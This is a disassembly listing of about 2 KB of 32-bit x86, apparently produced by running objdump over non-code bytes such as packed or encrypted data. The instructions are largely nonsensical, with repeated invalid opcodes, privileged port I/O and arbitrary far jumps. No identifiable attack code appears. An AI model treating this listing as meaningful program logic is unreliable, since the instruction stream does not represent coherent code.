  414dc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dc5:	dec    edx
  414dc6:	enter  0xc9ab,0x76
  414dca:	add    DWORD PTR [edx+esi*1+0x447621c5],0xfdf4b2a9
  414dd5:	jecxz  0x414d74
  414dd7:	fisubr WORD PTR [edx]
  414dd9:	pusha  
  414dda:	iret   
  414ddb:	mov    eax,DWORD PTR [eax-0x8]
  414dde:	jmp    0xac18:0x738fbe37
  414de5:	xor    DWORD PTR [eax],eax
  414de7:	repz inc esp
  414de9:	jmp    0x651867ba
  414dee:	es ret 
  414df0:	cmp    ebp,esi
  414df2:	sub    esi,DWORD PTR [ebp+0x67]
  414df5:	gs inc ecx
  414df7:	xchg   edi,eax
  414df8:	cmp    bl,BYTE PTR [ebx]
  414dfa:	add    al,BYTE PTR [esi+0x73]
  414dfd:	pop    eax
  414dfe:	enter  0xc004,0x61
  414e02:	mov    ebx,edi
  414e04:	call   0xc773400
  414e09:	mov    BYTE PTR [ebx-0x67],ah
  414e0c:	inc    ecx
  414e0d:	retf   0x50e
  414e10:	ds inc edi
  414e12:	fisttp WORD PTR [esi-0x5c]
  414e15:	loope  0x414da0
  414e17:	xchg   ebx,eax
  414e18:	in     al,dx
  414e19:	mov    edx,0xc8ae2ab3
  414e1e:	aam    0x65
  414e20:	mov    dl,0xf
  414e22:	xchg   esp,eax
  414e23:	xchg   edx,eax
  414e24:	push   edi
  414e25:	mov    bl,0xce
  414e27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e28:	xlat   BYTE PTR ds:[ebx]
  414e29:	jle    0x414e97
  414e2b:	pop    esp
  414e2c:	mov    ecx,0x7618bef6
  414e31:	jo     0x414deb
  414e33:	jg     0x414dff
  414e35:	cwde   
  414e36:	xchg   esi,eax
  414e37:	dec    ebp
  414e38:	(bad)  
  414e39:	push   eax
  414e3a:	or     edi,esi
  414e3c:	nop
  414e3d:	jae    0x414e72
  414e3f:	into   
  414e40:	rcl    bl,cl
  414e42:	pop    ss
  414e43:	pop    ebx
  414e44:	mov    al,ds:0x5e359a62
  414e49:	push   esp
  414e4a:	push   0xb4f355f4
  414e4f:	cld    
  414e50:	dec    esp
  414e51:	gs pop es
  414e53:	lods   eax,DWORD PTR ds:[esi]
  414e54:	add    eax,0xc454620a
  414e59:	fcmovnu st,st(2)
  414e5b:	and    eax,0x6291afba
  414e60:	fld    TBYTE PTR [ebp-0x357876c3]
  414e66:	out    0x32,eax
  414e68:	retf   0x1f8b
  414e6b:	mov    ds:0x2796f377,eax
  414e70:	ins    BYTE PTR es:[edi],dx
  414e71:	cld    
  414e72:	jno    0x414ee9
  414e74:	dec    ebx
  414e75:	aad    0xa5
  414e77:	jae    0x414e03
  414e79:	pop    edx
  414e7a:	or     eax,0xb65b168d
  414e7f:	test   DWORD PTR [esi+0x58],edi
  414e82:	dec    edx
  414e83:	inc    eax
  414e84:	std    
  414e85:	daa    
  414e86:	push   edx
  414e87:	cmp    ax,0x6ad2
  414e8b:	lahf   
  414e8c:	fnstenv [ebx-0x29]
  414e8f:	add    bl,BYTE PTR [edi-0x2b]
  414e92:	aas    
  414e93:	(bad)  
  414e94:	sub    ebp,DWORD PTR [edi]
  414e96:	cmp    BYTE PTR [edx-0x18e8c477],ah
  414e9c:	mov    ebp,esp
  414e9e:	(bad)  
  414e9f:	rol    DWORD PTR [ebx+ebp*1+0x5f],1
  414ea3:	in     al,0x8a
  414ea5:	lods   eax,DWORD PTR ds:[esi]
  414ea6:	mov    ah,0x29
  414ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ea9:	mov    ch,BYTE PTR [ecx]
  414eab:	sbb    ch,BYTE PTR [ebp+0x76b42322]
  414eb1:	clc    
  414eb2:	in     eax,0xa3
  414eb4:	jge    0x414f0a
  414eb6:	into   
  414eb7:	pop    ebx
  414eb8:	cmc    
  414eb9:	pusha  
  414eba:	xcrypt-ofb (bad)
  414ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ebc:	stos   BYTE PTR es:[edi],al
  414ebd:	pushw  0x1b
  414ec0:	fidivr WORD PTR [edx]
  414ec2:	push   eax
  414ec3:	pop    ebx
  414ec4:	mov    ebx,ebx
  414ec6:	out    dx,al
  414ec7:	push   ebp
  414ec8:	lds    eax,FWORD PTR [edx]
  414eca:	push   esp
  414ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ecc:	sub    eax,0x4b883c3c
  414ed1:	out    dx,al
  414ed2:	push   es
  414ed3:	push   edi
  414ed4:	lods   al,BYTE PTR ds:[esi]
  414ed5:	pushf  
  414ed6:	adc    al,0x42
  414ed8:	cli    
  414ed9:	daa    
  414eda:	mov    ecx,0x307af8b4
  414edf:	ins    BYTE PTR es:[edi],dx
  414ee0:	adc    DWORD PTR [esi+0x36],0x454de9c0
  414ee7:	add    BYTE PTR [eax-0x35],dh
  414eea:	sub    cl,0x76
  414eed:	clc    
  414eee:	sub    DWORD PTR [edx+0x18a216f7],ebx
  414ef4:	mov    ah,BYTE PTR [ebp+0x21]
  414ef7:	lea    ebp,[edx-0x41]
  414efa:	sub    bl,bl
  414efc:	mov    esp,0xa954d70
  414f01:	jb     0x414eeb
  414f03:	xor    edi,edx
  414f05:	jo     0x414ef2
  414f07:	jb     0x414edc
  414f09:	xchg   BYTE PTR [si+0x0],dl
  414f0d:	rol    DWORD PTR [ebp-0x66498fc4],0x3b
  414f14:	mov    BYTE PTR [ebx+0x614cec90],0xc7
  414f1b:	out    0xf3,eax
  414f1d:	push   0x74
  414f1f:	add    eax,0x33a5563d
  414f24:	and    eax,0xbd38ae92
  414f29:	pop    esp
  414f2a:	sub    ebx,DWORD PTR [ecx]
  414f2c:	icebp  
  414f2d:	(bad)
  414f31:	mov    bl,BYTE PTR [edx+0x5b452c73]
  414f37:	xchg   edi,eax
  414f38:	cmp    ebp,eax
  414f3a:	mov    gs,WORD PTR [esi]
  414f3c:	shr    bl,cl
  414f3e:	or     BYTE PTR [ecx],al
  414f40:	cmp    DWORD PTR [eax],esi
  414f42:	(bad)  
  414f43:	xor    DWORD PTR [ebp-0x27ea5f3e],edx
  414f49:	int3   
  414f4a:	aaa    
  414f4b:	jmp    0x414f0e
  414f4d:	fsubr  st,st(1)
  414f4f:	mov    edi,0xe3683318
  414f54:	add    esp,DWORD PTR [edi]
  414f56:	sahf   
  414f57:	imul   edi,ecx,0x4a
  414f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f5b:	mov    al,ds:0x11d17924
  414f60:	jmp    0x414f3b
  414f62:	sbb    esi,edi
  414f64:	dec    esp
  414f65:	std    
  414f66:	jmp    0x414f31
  414f68:	aam    0xef
  414f6a:	push   ebp
  414f6b:	xchg   esp,eax
  414f6c:	push   ecx
  414f6d:	fisttp WORD PTR [edi+0x23]
  414f70:	mov    ds:0xd3d80b12,al
  414f75:	das    
  414f76:	imul   eax,DWORD PTR [ecx+0x6e94676b],0xc69c409a
  414f80:	in     al,dx
  414f81:	xchg   esi,eax
  414f82:	test   DWORD PTR [edx+0x27],esp
  414f85:	mov    ds:0x59c4e2b5,eax
  414f8a:	inc    ecx
  414f8b:	or     edi,DWORD PTR [ebp-0x7a1ae485]
  414f91:	mov    DWORD PTR [edi],edx
  414f93:	sub    eax,0xdb66e2e
  414f98:	mov    edx,0xdc494610
  414f9d:	(bad)  
  414f9e:	cld    
  414f9f:	pop    esi
  414fa0:	add    BYTE PTR ds:0xfd164e4b,0xe1
  414fa7:	xor    al,0xe
  414fa9:	shr    bh,0xf0
  414fac:	mov    ?,WORD PTR [ebp-0x76]
  414faf:	adc    ebp,edx
  414fb1:	ins    BYTE PTR es:[edi],dx
  414fb2:	std    
  414fb3:	shl    ah,0xda
  414fb6:	jl     0x414fd0
  414fb8:	pop    ebp
  414fb9:	pop    esi
  414fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fbb:	jbe    0x414fd6
  414fbd:	pop    edi
  414fbe:	dec    eax
  414fbf:	sti    
  414fc0:	jecxz  0x41500b
  414fc2:	mov    cl,0x35
  414fc4:	xchg   ebx,eax
  414fc5:	ror    DWORD PTR [esi-0x33],0x27
  414fc9:	or     ebx,DWORD PTR [esi]
  414fcb:	mov    al,0xd2
  414fcd:	mov    al,ds:0x623ad0e1
  414fd2:	sub    eax,0x8e0ac555
  414fd7:	cmp    eax,0x8081695
  414fdc:	out    dx,al
  414fdd:	(bad)  
  414fde:	add    al,0xdc
  414fe0:	sub    cl,cl
  414fe2:	add    DWORD PTR [eax],edx
  414fe4:	test   DWORD PTR [edi+0x270aa1d8],0x48660604
  414fee:	mov    eax,ds:0x5277cbd8
  414ff3:	dec    eax
  414ff4:	out    0xc4,eax
  414ff6:	xlat   BYTE PTR ds:[ebx]
  414ff7:	adc    eax,0x543d7fb2
  414ffc:	cdq    
  414ffd:	fmul   DWORD PTR [ebp+0x2c]
  415000:	test   DWORD PTR [ecx+ebx*2-0x49],ebx
  415004:	js     0x414ff3
  415006:	scas   al,BYTE PTR es:[edi]
  415007:	aas    
  415008:	mov    dh,0x41
  41500a:	lods   al,BYTE PTR ds:[esi]
  41500b:	(bad)  
  41500c:	fldcw  WORD PTR [eax-0x775184b8]
  415012:	loope  0x415060
  415014:	sbb    eax,0x331b905a
  415019:	cmc    
  41501a:	adc    eax,0x281cab2f
  41501f:	popa   
  415020:	ror    BYTE PTR [ebx+0x5],cl
  415023:	ret    
  415024:	mov    ds,WORD PTR [esi-0x228cba9]
  41502a:	cli    
  41502b:	stos   BYTE PTR es:[edi],al
  41502c:	jle    0x415049
  41502e:	mov    ecx,0x34c43ac7
  415033:	(bad)  
  415034:	rcl    DWORD PTR [edi],1
  415036:	jb     0x41504e
  415038:	sub    DWORD PTR [esi+0x30b6c7ac],eax
  41503e:	push   eax
  41503f:	add    BYTE PTR [edx+eax*2-0x4a98303a],ah
  415046:	shl    BYTE PTR [edi-0x63],1
  415049:	push   ebp
  41504a:	xor    al,0x61
  41504c:	push   edx
  41504d:	bound  edx,QWORD PTR [eax+edx*4-0x7b43a39d]
  415054:	mov    cl,0x99
  415056:	push   esp
  415057:	test   DWORD PTR [eax],esi
  415059:	aaa    
  41505a:	out    0x13,eax
  41505c:	sbb    eax,0xb37f24ec
  415061:	push   cs
  415062:	push   0x10
  415064:	pop    ecx
  415065:	cld    
  415066:	(bad)  
  415067:	fidivr WORD PTR [ebx+0x48]
  41506a:	xor    BYTE PTR [esi+0xc],0xac
  41506e:	push   ecx
  41506f:	ins    DWORD PTR es:[edi],dx
  415070:	cmp    BYTE PTR [edx+0x59],bl
  415073:	jmp    0x82ff4f3f
  415078:	das    
  415079:	imul   DWORD PTR [eax+ebx*4+0x3d]
  41507d:	pushf  
  41507e:	pop    esi
  41507f:	in     eax,0x9c
  415081:	std    
  415082:	push   es
  415083:	dec    ecx
  415084:	xchg   ebx,eax
  415085:	mov    ebx,0x98b45f6e
  41508a:	lds    esp,FWORD PTR [ecx+esi*8]
  41508d:	sbb    al,0xc8
  41508f:	push   ebp
  415090:	test   DWORD PTR [edi+ebx*8],0x1e3c7b02
  415097:	sti    
  415098:	or     bl,BYTE PTR [edi+0x17]
  41509b:	inc    esi
  41509c:	mov    dh,0xc5
  41509e:	psubsb mm7,QWORD PTR [esi-0x5e3c27f]
  4150a5:	jb     0x415057
  4150a7:	pop    edx
  4150a8:	push   es
  4150a9:	(bad)  
  4150aa:	scas   al,BYTE PTR es:[edi]
  4150ab:	ja     0x4150d0
  4150ad:	inc    edi
  4150ae:	or     DWORD PTR [edx-0x603a82],ebp
  4150b4:	adc    cl,ah
  4150b6:	cmc    
  4150b7:	mov    bh,0x1a
  4150b9:	xchg   ebx,eax
  4150ba:	rol    DWORD PTR [eax+0x0],cl
  4150bd:	ret    0xbf35
  4150c0:	mov    WORD PTR [ebp-0x15f526ec],?
  4150c6:	pop    ds
  4150c7:	loopne 0x4150bd
  4150c9:	in     eax,0xd0
  4150cb:	lods   eax,DWORD PTR ds:[esi]
  4150cc:	inc    eax
  4150cd:	pop    edx
  4150ce:	cmp    bl,BYTE PTR [edx+0x10]
  4150d1:	imul   edx,DWORD PTR [ebp+0x1086871b],0x3676fea
  4150db:	pop    esi
  4150dc:	mov    dl,0x9f
  4150de:	daa    
  4150df:	cdq    
  4150e0:	jnp    0x4150ce
  4150e2:	ret    0x4fee
  4150e5:	je     0x41510d
  4150e7:	out    dx,eax
  4150e8:	fistp  DWORD PTR [ebp-0x57]
  4150eb:	dec    esi
  4150ec:	or     bl,cl
  4150ee:	das    
  4150ef:	sub    bh,dl
  4150f1:	data16 stc 
  4150f3:	xor    edx,esi
  4150f5:	fmul   QWORD PTR [ebx+0x4d]
  4150f8:	jae    0x415116
  4150fa:	mov    ebp,0xee9cf44b
  4150ff:	dec    esp
  415100:	push   ecx
  415101:	jle    0x415173
  415103:	in     eax,0xce
  415105:	and    DWORD PTR [edx+0x1c],ecx
  415108:	mov    eax,ds:0xbb418d8
  41510d:	mov    WORD PTR [ebx+ebx*4+0x22],gs
  415111:	adc    eax,0x86620f4b
  415116:	add    DWORD PTR [eax+eax*1-0x5b],edx
  41511a:	mov    dl,0x49
  41511c:	pop    eax
  41511d:	loope  0x415100
  41511f:	cs push edi
  415121:	mov    esp,0x8b3a98db
  415126:	xchg   DWORD PTR [edi],edi
  415128:	aam    0x5d
  41512a:	imul   ecx,DWORD PTR [edi-0x74902faa],0xf153ccd2
  415134:	jne    0x415155
  415136:	sub    ecx,DWORD PTR [ecx-0x2b]
  415139:	ins    BYTE PTR es:[edi],dx
  41513a:	iret   
  41513b:	repnz shl DWORD PTR [esi+0x7ceee854],1
  415142:	inc    ebx
  415143:	clc    
  415144:	mov    ebp,0x786319c9
  415149:	xchg   esi,eax
  41514a:	enter  0x9eb6,0x7f
  41514e:	jo     0x4151ca
  415150:	loopne 0x41517d
  415152:	scas   al,BYTE PTR es:[edi]
  415153:	push   0x5e
  415155:	dec    ebx
  415156:	popa   
  415157:	lahf   
  415158:	aad    0x3f
  41515a:	fisubr WORD PTR [esi-0x61]
  41515d:	int    0x3e
  41515f:	add    BYTE PTR [esi*4-0x38b342a0],ch
  415166:	adc    eax,0xeb232bf
  41516b:	pop    ecx
  41516c:	sar    dh,0x38
  41516f:	das    
  415170:	or     DWORD PTR [eax-0x1aba0937],0x8814f179
  41517a:	ins    BYTE PTR es:[edi],dx
  41517b:	in     eax,dx
  41517c:	pop    ebx
  41517d:	push   esp
  41517e:	jg     0x4151ef
  415180:	les    esp,FWORD PTR [ebx]
  415182:	push   cs
  415183:	push   es
  415184:	add    bh,dh
  415186:	fdivr  QWORD PTR [edx+edx*2]
  415189:	idiv   BYTE PTR [eax]
  41518b:	test   eax,0x37f695ac
  415190:	mov    cl,0xc4
  415192:	out    0xb0,eax
  415194:	cld    
  415195:	mov    ebx,0x4ddcdf15
  41519a:	cs ret 
  41519c:	fsubrp st(4),st
  41519e:	icebp  
  41519f:	or     DWORD PTR [esi+0x45],0xadadf283
  4151a6:	sub    al,0x8f
  4151a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151a9:	pop    edi
  4151aa:	in     eax,0x5f
  4151ac:	enter  0x9850,0x56
  4151b0:	test   al,0x81
  4151b2:	dec    esp
  4151b3:	call   0x46db:0xc2d7c9ff
  4151ba:	fistp  QWORD PTR [ebx+0x1da34e5]
  4151c0:	adc    ebp,esp
  4151c2:	popa   
  4151c3:	dec    ecx
  4151c4:	and    BYTE PTR [eax+eax*8+0x4c],0x7c
  4151c9:	push   ds
  4151ca:	inc    eax
  4151cb:	add    DWORD PTR [ebp+0x3f],0x5b9e6d0e
  4151d2:	add    eax,0x8259752e
  4151d7:	mov    BYTE PTR [ecx],dh
  4151d9:	aaa    
  4151da:	(bad)  
  4151db:	and    al,0x3d
  4151dd:	jg     0x41523a
  4151df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e0:	frstor [esi]
  4151e2:	jge    0x4151a9
  4151e4:	(bad)  
  4151e5:	xor    bl,BYTE PTR [ebp+0x65a6dfc]
  4151eb:	jno    0x4151a0
  4151ed:	adc    BYTE PTR [esi+eax*8+0x8],0x5e
  4151f2:	cmp    ebx,DWORD PTR [eax+0x2b7e264c]
  4151f8:	add    dh,BYTE PTR [edx-0x37f69b47]
  4151fe:	inc    esi
  4151ff:	add    BYTE PTR [esi-0x47],dh
  415202:	test   esp,ebp
  415204:	in     al,0x83
  415206:	sbb    al,BYTE PTR [ebx-0x39174288]
  41520c:	sub    BYTE PTR [edx-0x3],cl
  41520f:	js     0x41524b
  415211:	mov    DWORD PTR [ebp+0xd4f39d3],edi
  415217:	xchg   ecx,eax
  415218:	adc    eax,DWORD PTR [ecx]
  41521a:	loop   0x41521b
  41521c:	shl    bh,0x1
  41521f:	sub    eax,0x44b11e9f
  415224:	in     al,0x76
  415226:	shl    DWORD PTR [edx+0x23],1
  415229:	arpl   bx,dx
  41522b:	pop    esp
  41522c:	(bad)  
  41522d:	in     al,0x54
  41522f:	dec    edx
  415230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415231:	xchg   edx,eax
  415232:	ss sar dh,cl
  415235:	enter  0x130f,0x4c
  415239:	pop    esp
  41523a:	js     0x415212
  41523c:	dec    eax
  41523d:	pop    edi
  41523e:	ror    DWORD PTR [edi-0x36bbfb99],1
  415244:	xchg   ebx,eax
  415245:	mov    ebx,0x8987f60a
  41524a:	and    al,0x65
  41524c:	push   0xc5b6555b
  415251:	xchg   ebx,eax
  415252:	mov    WORD PTR [edi-0xd],cs
  415255:	lock pop eax
  415257:	mov    edi,0x571ff987
  41525c:	sub    BYTE PTR [ecx],ah
  41525e:	lock mov esp,0xb38a6817
  415264:	adc    DWORD PTR [ecx+0x46],ebp
  415267:	jns    0x415230
  415269:	pop    ecx
  41526a:	pop    ecx
  41526b:	and    al,0x6
  41526d:	adc    BYTE PTR [ecx-0x56d30e68],ch
  415273:	push   esi
  415274:	dec    esi
  415275:	ret    0x8814
  415278:	daa    
  415279:	push   eax
  41527a:	mov    dh,0x70
  41527c:	push   ecx
  41527d:	imul   BYTE PTR [esi+0x7dba6981]
  415283:	icebp  
  415284:	mov    bh,0xcf
  415286:	push   ss
  415287:	sbb    eax,0x4d62ccea
  41528c:	pop    ss
  41528d:	inc    eax
  41528e:	in     al,dx
  41528f:	xchg   BYTE PTR [esi],bh
  415291:	and    bh,ah
  415293:	jg     0x4152a8
  415295:	call   0x52c3:0x60863bb9
  41529c:	mov    ch,BYTE PTR [eax+eiz*2]
  41529f:	lahf   
  4152a0:	jecxz  0x41526b
  4152a2:	dec    ebp
  4152a3:	push   eax
  4152a4:	jae    0x41525f
  4152a6:	xor    DWORD PTR [edi+eiz*8+0x2399ed5e],edi
  4152ad:	add    esp,esp
  4152af:	dec    ebx
  4152b0:	ret    0x7254
  4152b3:	and    BYTE PTR [ebp+0x20],dl
  4152b6:	clc    
  4152b7:	jnp    0x415314
  4152b9:	push   ds
  4152ba:	call   0x3c8a:0xb4c25f4e
  4152c1:	shr    DWORD PTR [esi+0x6e3b47e8],cl
  4152c7:	adc    ebp,DWORD PTR [eax+0x73d48050]
  4152cd:	sub    al,0xe7
  4152cf:	sub    BYTE PTR [edi-0xa],dh
  4152d2:	sbb    BYTE PTR [edx-0x5490cff1],bl
  4152d8:	mov    edi,0x131b2390
  4152dd:	cmp    bh,BYTE PTR [edx]
  4152df:	fnstcw WORD PTR ds:0x4e64c655
  4152e5:	icebp  
  4152e6:	sub    DWORD PTR [eax+0x3],ecx
  4152e9:	jnp    0x4152b5
  4152eb:	and    ebx,edi
  4152ed:	adc    BYTE PTR [edx+0x59c4a55f],bl
  4152f3:	call   0x48ebb50b
  4152f8:	mov    ah,0x0
  4152fa:	mov    cl,0xe3
  4152fc:	fidivr DWORD PTR ds:0x9cc9b77c
  415302:	test   eax,0x76f32632
  415307:	mov    al,0xdc
  415309:	fs xor eax,0x31a74542
  41530f:	push   edi
  415310:	ret    0x9252
  415313:	and    dl,BYTE PTR [edx+ebp*4]
  415316:	test   DWORD PTR [edx+0x1f281923],ebp
  41531c:	into   
  41531d:	mov    dh,0x78
  41531f:	xlat   BYTE PTR ds:[ebx]
  415320:	mov    esp,0x3cc324cd
  415325:	push   ss
  415326:	stos   DWORD PTR es:[edi],eax
  415327:	xchg   esp,eax
  415328:	ins    BYTE PTR es:[edi],dx
  415329:	adc    dl,BYTE PTR [ecx-0x62]
  41532c:	clc    
  41532d:	popf   
  41532e:	rcl    DWORD PTR [ebx+ebp*4],1
  415331:	and    DWORD PTR [ebp-0x1a],esi
  415334:	sub    cl,BYTE PTR [edi+0x73400eef]
  41533a:	push   ebx
  41533b:	call   0xedc6:0xddf8b19d
  415342:	rcr    BYTE PTR [ebp+0x13],cl
  415345:	xchg   ebp,eax
  415346:	push   ds
  415347:	push   esi
  415348:	in     eax,dx
  415349:	inc    eax
  41534a:	leave  
  41534b:	adc    cl,BYTE PTR [ebx]
  41534d:	lods   al,BYTE PTR ds:[esi]
  41534e:	push   ecx
  41534f:	mov    al,ds:0xc387ced4
  415354:	jnp    0x415397
  415356:	(bad)  
  415357:	cwde   
  415358:	int    0x20
  41535a:	ds pop eax
  41535c:	or     esi,DWORD PTR [esp+eax*1]
  41535f:	sub    edi,DWORD PTR [edi+0x6a]
  415362:	inc    edx
  415363:	pop    edi
  415364:	add    eax,0xeb8e91da
  415369:	or     al,0x80
  41536b:	sub    ecx,DWORD PTR [edx]
  41536d:	xchg   edx,eax
  41536e:	lea    esp,[edi+0x48]
  415371:	mov    ebx,0xf9386355
  415376:	add    BYTE PTR [edx-0x9],ch
  415379:	stos   BYTE PTR es:[edi],al
  41537a:	push   0x4b
  41537c:	sbb    BYTE PTR [edx],al
  41537e:	jne    0x4153ab
  415380:	mov    ah,0x12
  415382:	xchg   esp,eax
  415383:	int    0xcf
  415385:	pop    esp
  415386:	jle    0x41530b
  415388:	push   es
  415389:	inc    ebp
  41538a:	ror    BYTE PTR [ebx+0xf],0x52
  41538e:	dec    eax
  41538f:	xchg   esp,eax
  415390:	les    esi,FWORD PTR [eax]
  415392:	shr    BYTE PTR ds:0x26823b1f,1
  415398:	sbb    bh,bh
  41539a:	mov    ebx,0x3fb46898
  41539f:	cmc    
  4153a0:	mov    eax,ds:0x40a64b1c
  4153a5:	and    DWORD PTR [edi-0x68eff9f1],0x3c95616e
  4153af:	adc    DWORD PTR [esi],0x4a5234c4
  4153b5:	adc    ah,BYTE PTR [ecx]
  4153b7:	inc    edi
  4153b8:	mov    al,ds:0xa93de00d
  4153bd:	lds    edx,FWORD PTR [ecx+0x1e139b46]
  4153c3:	or     DWORD PTR [ebx+esi*1],0xd50d787a
  4153ca:	iret   
  4153cb:	scas   eax,DWORD PTR es:[edi]
  4153cc:	sub    DWORD PTR [esi],eax
  4153ce:	lock std 
  4153d0:	jns    0x415423
  4153d2:	popf   
  4153d3:	sahf   
  4153d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153d5:	xchg   esi,eax
  4153d6:	jmp    0x90fe6df5
  4153db:	fidivr DWORD PTR [ecx-0x492c530e]
  4153e1:	jno    0x415437
  4153e3:	sub    al,0x23
  4153e5:	rol    DWORD PTR [ecx],cl
  4153e7:	dec    esp
  4153e8:	jns    0x4153ba
  4153ea:	xchg   ebp,eax
  4153eb:	mov    eax,0xde91e716
  4153f0:	adc    eax,0x928876eb
  4153f5:	stos   BYTE PTR es:[edi],al
  4153f6:	cs mov al,0x19
  4153f9:	adc    ebp,DWORD PTR [edx-0x1e]
  4153fc:	xchg   ebp,eax
  4153fd:	or     eax,0x8ca715aa
  415402:	shr    dh,cl
  415404:	pusha  
  415405:	mov    ds:0xf0935bbd,al
  41540a:	(bad)  
  41540b:	fsub   QWORD PTR [eax+0x573c6667]
  415411:	xchg   BYTE PTR ds:0x7bc60f98,dl
  415417:	imul   esi,ecx,0xd
  41541a:	stos   DWORD PTR es:[edi],eax
  41541b:	pop    es
  41541c:	mov    bl,0xec
  41541e:	outs   dx,BYTE PTR ds:[esi]
  41541f:	and    al,0x4a
  415421:	iret   
  415422:	mov    dh,bh
  415424:	in     al,0x62
  415426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415427:	repz jge 0x4153c9
  41542a:	out    0x4a,al
  41542c:	mov    BYTE PTR [esi+ebp*1],0xe2
  415430:	adc    DWORD PTR [ecx+0x1e],eax
  415433:	jp     0x4153fd
  415435:	mov    al,0xb4
  415437:	ja     0x415410
  415439:	test   al,0xc5
  41543b:	mov    ch,0xc8
  41543d:	sbb    esi,DWORD PTR [esi]
  41543f:	js     0x415455
  415441:	das    
  415442:	sub    ch,bl
  415444:	enter  0xf233,0x61
  415448:	ficomp WORD PTR [eax]
  41544a:	mov    cl,0x86
  41544c:	xchg   ecx,eax
  41544d:	adc    bl,ch
  41544f:	cs push cs
  415451:	enter  0x2c54,0xd3
  415455:	std    
  415456:	mov    edx,DWORD PTR [ebp+0x0]
  415459:	add    BYTE PTR [ebp-0x6f0221f6],dh
  41545f:	and    eax,0xc209ab20
  415464:	dec    esp
  415465:	push   ecx
  415466:	stos   BYTE PTR es:[edi],al
  415467:	xchg   esi,eax
  415468:	cmp    eax,esi
  41546a:	jb     0x4154a5
  41546c:	xchg   ecx,eax
  41546d:	addr16 mov dh,0xe0
  415470:	xor    DWORD PTR [esp+ebp*1],esi
  415473:	in     al,dx
  415474:	pop    ebp
  415475:	arpl   WORD PTR [edi],bp
  415477:	mov    ecx,0x4578230f
  41547c:	mov    ds:0xe1ccd621,al
  415481:	popf   
  415482:	jmp    0x128c:0x7046027e
  415489:	pop    edx
  41548a:	loop   0x41542d
  41548c:	xor    ebx,esp
  41548e:	clc    
  41548f:	mov    cl,0x57
  415491:	xchg   ebp,eax
  415492:	add    BYTE PTR [esi-0x51],bl
  415495:	jne    0x4154fd
  415497:	mov    eax,0x8ce3d36b
  41549c:	dec    esi
  41549d:	push   es
  41549e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41549f:	aas    
  4154a0:	xchg   esp,eax
  4154a1:	lods   al,BYTE PTR ds:[esi]
  4154a2:	ins    DWORD PTR es:[edi],dx
  4154a3:	in     al,0xa2
  4154a5:	stc    
  4154a6:	ins    DWORD PTR es:[edi],dx
  4154a7:	cmp    eax,0x814eaf5c
  4154ac:	mov    al,ds:0xbe9159dd
  4154b1:	fisttp DWORD PTR [edi]
  4154b3:	pop    esi
  4154b4:	outs   dx,DWORD PTR ds:[esi]
  4154b5:	(bad)  
  4154b6:	(bad)  [esi+0x17]
  4154b9:	pop    ss
  4154ba:	sub    bl,BYTE PTR [edi+0x51]
  4154bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154be:	add    BYTE PTR [eax],al
  4154c0:	xor    eax,0x3191952c
  4154c5:	lds    esp,FWORD PTR [edx+0x76]
  4154c8:	jo     0x4154ab
  4154ca:	cli    
  4154cb:	cmc    
  4154cc:	xchg   ebx,eax
  4154cd:	pop    ecx
  4154ce:	pop    ss
  4154cf:	cmp    edx,DWORD PTR [esi+0x453198a4]
  4154d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154d6:	push   edi
  4154d7:	aas    
  4154d8:	ffreep st(5)
  4154da:	lods   eax,DWORD PTR ds:[esi]
  4154db:	adc    eax,0x3b98b798
  4154e0:	rol    BYTE PTR [ecx+0x40ffe5b6],cl
  4154e6:	out    dx,al
  4154e7:	mov    al,ds:0x84708e06
  4154ec:	cmp    eax,0x75520394
  4154f1:	mov    ds:0xed024510,eax
  4154f6:	test   esi,0xd7ca5625
  4154fc:	lock adc al,0x2f
  4154ff:	mov    esp,0x4f37a1a3
  415504:	repnz test DWORD PTR [esi-0x5a],ecx
  415508:	mov    eax,0xa19db18f
  41550d:	dec    edi
  41550e:	sbb    ebx,esp
  415510:	and    cl,ah
  415512:	test   al,0x95
  415514:	and    eax,0x7d601deb
  415519:	jb     0x4154e4
  41551b:	push   esi
  41551c:	mov    BYTE PTR [eax],cl
  41551e:	pusha  
  41551f:	push   esp
  415520:	pop    ds
  415521:	jbe    0x4154e6
  415523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415524:	cmp    edx,esp
  415526:	into   
  415527:	pop    ss
  415528:	cwde   
  415529:	xor    DWORD PTR [ebp+eiz*2+0x2d1821d],eax
  415530:	cmp    bl,bl
  415532:	jne    0x415504
  415534:	xor    ebx,ebp
  415536:	lock dec edx
  415538:	sub    ch,BYTE PTR [edi-0x448f664d]
  41553e:	push   edi
  41553f:	popf   
  415540:	mov    bh,0xd5
  415542:	mov    ah,0xab
  415544:	pop    edx
  415545:	add    al,0x2b
  415547:	sub    edi,edx
  415549:	and    eax,esi
  41554b:	dec    esp
  41554c:	out    dx,al
  41554d:	xchg   esi,eax
  41554e:	sub    DWORD PTR [ebx+0x60095dac],edi
  415554:	sar    DWORD PTR [esi+0x7e],1
  415557:	or     eax,0x5c7c4648
  41555c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41555d:	(bad)  cs:[esi+0x54]
  415561:	adc    DWORD PTR [edi],esp
  415563:	xor    al,0x4
  415565:	pop    esi
  415566:	lahf   
  415567:	push   esi
  415568:	sub    ecx,DWORD PTR [eax+ebp*8+0x1]
  41556c:	xor    DWORD PTR [ecx-0x2f],esi
  41556f:	outs   dx,DWORD PTR ds:[esi]
  415570:	and    al,0x2a
  415572:	lods   al,BYTE PTR ds:[esi]
  415573:	jo     0x415516
  415575:	push   ss
  415576:	gs out dx,eax
  415578:	add    eax,0x268bab1d
  41557d:	cmp    BYTE PTR [eax],bl
